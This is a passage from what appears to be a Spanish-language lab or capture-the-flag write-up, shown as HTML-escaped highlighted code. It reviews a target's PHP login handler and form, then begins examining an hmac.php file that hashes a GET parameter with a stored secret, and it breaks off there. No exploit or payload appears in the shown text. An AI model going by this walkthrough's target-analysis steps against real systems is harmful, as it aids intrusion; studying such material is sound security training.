class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//destroy any existing cookie by setting time in past
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blanked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blanked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;session_unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;session_destroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;

      &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;span class=&amp;#34;red&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;INCORRECT_USERNAME_PASSWORD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/span&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;STARTER_GREETING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;	&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[...&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;wrapper&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;highlight&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;center&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pure-form pure-form-stacked&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;fieldset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;legend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;STARTER_GREETING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;legend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;action&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;set_login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- &amp;lt;label for=&amp;#34;username&amp;#34;&amp;gt;&amp;lt;strong&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;USERNAME&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;:&amp;lt;/strong&amp;gt;&amp;lt;/label&amp;gt; --&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;placeholder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ENTER_USERNAME&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pure-input-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- &amp;lt;label for=&amp;#34;password&amp;#34;&amp;gt;&amp;lt;strong&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PASSWORD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;:&amp;lt;/strong&amp;gt;&amp;lt;/label&amp;gt; --&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;placeholder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ENTER_PASSWORD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pure-input-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;label&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;remember&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pure-checkbox&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;remember&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;remember&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;checkbox&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;REMEMBER_THIS_COMPUTER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;button&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pure-button pure-button-primary&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;BUTTON_LOGIN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;button&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;fieldset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}}&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;36c53649cb57bbe5\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;p&gt;Finalmente tenemos el archivo &lt;code&gt;hmac.php&lt;/code&gt;, segun el codigo, este requiere de los parametros &lt;code&gt;h&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt; y &lt;code&gt;n&lt;/code&gt;, tambien utiliza el archivo &lt;code&gt;secret.php&lt;/code&gt; para obtener la variable &lt;code&gt;$secret&lt;/code&gt; que es utilizada para crear un hash &lt;code&gt;sha256&lt;/code&gt; con el parametro &lt;code&gt;n&lt;/code&gt; y en la variable &lt;code&gt;$hm&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:hmac.php&#34; data-lang=&#34;php:hmac.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP/1.0 400 Bad Request&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;missing get parameter&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;secret.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//set $secret var
